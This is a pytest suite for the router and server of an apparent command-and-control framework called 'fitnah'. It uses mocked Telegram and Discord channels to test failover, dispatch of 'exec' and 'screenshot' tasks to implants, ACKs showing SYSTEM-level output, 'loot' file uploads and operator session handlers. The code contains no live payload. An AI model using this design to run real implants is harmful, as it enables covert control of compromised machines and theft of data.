"""
Phase 2 tests — Router and C2Server (transport-independent).
Transports are mocked so tests run without Telegram/Discord credentials.
"""
from __future__ import annotations

import asyncio
import json
import pytest
import pytest_asyncio

from fitnah.c2.transport.base import AbstractTransport
from fitnah.c2.router import Router
from fitnah.c2.server import C2Server, TaskStatus


# ── Mock transport ────────────────────────────────────────────────────────────

class MockTransport(AbstractTransport):
    def __init__(self, name: str, priority: int, starts_alive: bool = True):
        self.name     = name
        self.priority = priority
        self._alive   = starts_alive
        self.sent: list[dict] = []
        self._queue: asyncio.Queue = asyncio.Queue()

    async def connect(self) -> None:
        self._alive = True

    async def disconnect(self) -> None:
        self._alive = False

    async def send(self, chat_id: str, text: str) -> None:
        if not self._alive:
            raise RuntimeError(f"{self.name} is dead")
        self.sent.append({"chat_id": chat_id, "text": text, "type": "text"})

    async def send_file(self, chat_id, filename, data, caption=""):
        self.sent.append({"chat_id": chat_id, "filename": filename, "type": "file"})

    async def send_photo(self, chat_id, data, caption=""):
        self.sent.append({"chat_id": chat_id, "type": "photo"})

    async def listen(self):
        while self._alive:
            msg = await self._queue.get()
            yield msg

    def inject(self, chat_id: str, text: str) -> None:
        """Simulate an incoming message."""
        self._queue.put_nowait({
            "chat_id": chat_id, "sender_id": "op-1",
            "text": text, "_transport": self.name,
        })

    def kill(self) -> None:
        self._alive = False

    def revive(self) -> None:
        self._alive = True

    @property
    def is_alive(self) -> bool:
        return self._alive


# ── Router tests ──────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_router_sends_via_primary():
    tg = MockTransport("telegram", 0)
    dc = MockTransport("discord",  1)
    router = Router([tg, dc], failover_threshold=3)

    ok = await router.send("chat-1", "hello")
    assert ok is True
    assert len(tg.sent) == 1
    assert len(dc.sent) == 0
    assert tg.sent[0]["text"] == "hello"


@pytest.mark.asyncio
async def test_router_failover_to_discord_when_telegram_dead():
    tg = MockTransport("telegram", 0, starts_alive=False)
    dc = MockTransport("discord",  1)
    router = Router([tg, dc], failover_threshold=3)

    ok = await router.send("chat-1", "hello")
    assert ok is True
    assert len(dc.sent) == 1


@pytest.mark.asyncio
async def test_router_failover_after_threshold():
    failovers = []

    class FailingTransport(MockTransport):
        async def send(self, chat_id, text):
            raise RuntimeError("network error")

    tg = FailingTransport("telegram", 0)
    dc = MockTransport("discord", 1)
    router = Router(
        [tg, dc],
        failover_threshold=2,
        on_failover=lambda f, t: failovers.append((f, t)),
    )

    # first two failures should trigger failover
    await router.send("chat-1", "msg1")
    await router.send("chat-1", "msg2")

    assert len(failovers) >= 1
    assert failovers[0][0] == "telegram"
    assert failovers[0][1] == "discord"


@pytest.mark.asyncio
async def test_router_both_dead_returns_false():
    tg = MockTransport("telegram", 0, starts_alive=False)
    dc = MockTransport("discord",  1, starts_alive=False)
    router = Router([tg, dc])

    ok = await router.send("chat-1", "hello")
    assert ok is False


@pytest.mark.asyncio
async def test_router_fan_in_merges_messages():
    tg = MockTransport("telegram", 0)
    dc = MockTransport("discord",  1)
    router = Router([tg, dc])

    received = []

    async def collect():
        count = 0
        async for msg in router.listen():
            received.append(msg)
            count += 1
            if count >= 2:
                break

    task = asyncio.create_task(collect())
    await asyncio.sleep(0.05)

    tg.inject("chat-1", "from telegram")
    dc.inject("chat-1", "from discord")

    await asyncio.wait_for(task, timeout=2)

    transports = {m["_transport"] for m in received}
    assert "telegram" in transports
    assert "discord" in transports


@pytest.mark.asyncio
async def test_router_status_table():
    tg = MockTransport("telegram", 0)
    dc = MockTransport("discord",  1, starts_alive=False)
    router = Router([tg, dc])
    table = router.status_table()
    assert "telegram" in table
    assert "discord" in table
    assert "ALIVE" in table
    assert "DEAD" in table


@pytest.mark.asyncio
async def test_router_active_transport_name():
    tg = MockTransport("telegram", 0)
    dc = MockTransport("discord",  1)
    router = Router([tg, dc])
    assert router.active_transport == "telegram"

    tg.kill()
    assert router.active_transport == "discord"

    tg.kill(); dc.kill()
    router2 = Router([tg, dc])
    assert router2.active_transport == "none"


@pytest.mark.asyncio
async def test_router_send_file():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    ok = await router.send_file("chat-1", "loot.txt", b"data")
    assert ok is True
    assert tg.sent[0]["type"] == "file"


@pytest.mark.asyncio
async def test_router_send_photo():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    ok = await router.send_photo("chat-1", b"\x89PNG")
    assert ok is True
    assert tg.sent[0]["type"] == "photo"


# ── C2Server tests ────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_c2_dispatch_and_ack():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    c2 = C2Server(router, task_timeout=5)

    async def simulate_ack():
        # wait for the TASK message to appear in tg.sent
        for _ in range(50):
            await asyncio.sleep(0.05)
            if tg.sent:
                break
        task_msg = json.loads(tg.sent[0]["text"])
        task_id  = task_msg["id"]
        # implant sends ACK back
        ack = json.dumps({
            "type": "ACK", "id": task_id,
            "status": "ok", "output": "nt authority\\system",
        })
        tg.inject("chat-1", ack)

    asyncio.create_task(simulate_ack())

    # start the server loop
    asyncio.create_task(c2.run())

    result = await c2.dispatch("agent-001", "chat-1", "exec", {"cmd": "whoami"})
    assert result["status"] == "ok"
    assert "system" in result["output"]


@pytest.mark.asyncio
async def test_c2_dispatch_timeout():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    c2 = C2Server(router, task_timeout=1)  # 1 second timeout

    asyncio.create_task(c2.run())

    result = await c2.dispatch("agent-001", "chat-1", "exec", {"cmd": "whoami"})
    assert result["status"] == "timeout"


@pytest.mark.asyncio
async def test_c2_operator_handler_called():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    c2 = C2Server(router)

    called = []

    async def my_handler(chat_id, sender_id, args, router):
        called.append({"chat_id": chat_id, "args": args})

    c2.register_handler("sessions", my_handler)

    asyncio.create_task(c2.run())
    await asyncio.sleep(0.05)

    tg.inject("chat-1", "sessions -l")
    await asyncio.sleep(0.2)

    assert len(called) == 1
    assert called[0]["args"] == "-l"


@pytest.mark.asyncio
async def test_c2_stats_tracking():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    c2 = C2Server(router, task_timeout=1)

    asyncio.create_task(c2.run())
    await c2.dispatch("a1", "chat-1", "exec")   # will timeout

    stats = c2.stats()
    assert stats["dispatched"] == 1
    assert stats["timed_out"] == 1


@pytest.mark.asyncio
async def test_c2_pending_tasks_visible():
    tg = MockTransport("telegram", 0)
    router = Router([tg])
    c2 = C2Server(router, task_timeout=30)

    asyncio.create_task(c2.run())

    # dispatch but don't ACK — task stays pending
    dispatch_task = asyncio.create_task(
        c2.dispatch("a1", "chat-1", "screenshot")
    )
    await asyncio.sleep(0.1)

    pending = c2.pending_tasks()
    assert len(pending) == 1
    assert pending[0]["command"] == "screenshot"

    dispatch_task.cancel()
    try:
        await dispatch_task
    except asyncio.CancelledError:
        pass
